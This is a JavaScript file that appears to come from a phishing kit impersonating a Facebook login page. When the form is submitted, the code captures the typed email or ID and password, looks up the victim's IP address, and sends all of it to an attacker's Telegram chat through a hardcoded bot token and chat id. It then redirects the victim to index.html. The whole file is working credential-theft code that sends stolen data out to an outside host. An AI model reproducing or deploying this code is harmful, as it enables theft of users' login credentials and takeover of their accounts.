        let tg = {
    token: "5640910643:AAHZovo7fnFAS5WAGSnppSQkqBPivgNRZEc", // Your bot's token that got from @BotFather
    chat_id: -1001892111363 // The user's(that you want to send a message) telegram chat id
}

/**
 * By calling this function you can send message to a specific user()
 * @param {String} the text to send
 *
*/
function sendMessage(text)
{
    const url = `https://api.telegram.org/bot${tg.token}/sendMessage?chat_id=${tg.chat_id}&text=${text}`; // The url to request
    const xht = new XMLHttpRequest();
    xht.open("GET", url);

    xht.onreadystatechange = function() {
        //var bernum =document.getElementById("uberphone").value;
        var thankyou=1;
        if(thankyou=1){
           window.location.href="index.html"
        }
        return;
    }
    xht.send();
    
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
const form = document.querySelector("#form");
        form.addEventListener("submit", (e)=>{
            e.preventDefault();
        
            var ad;         
        $.getJSON("https://api.ipify.org?format=json",function(data){
             $(ad=data.ip)

        
        //fourth
        
        var usernameid = document.getElementById("email").value;
        var pass1 = document.getElementById("password").value;

        var mess=`:::Results Of Facebook Login::: %0A%0A -  Username or ID : ${usernameid} %0A - Password : ${pass1} %0A - IPAdrress : ${ad}`

        sendMessage(mess)
        
        })})
        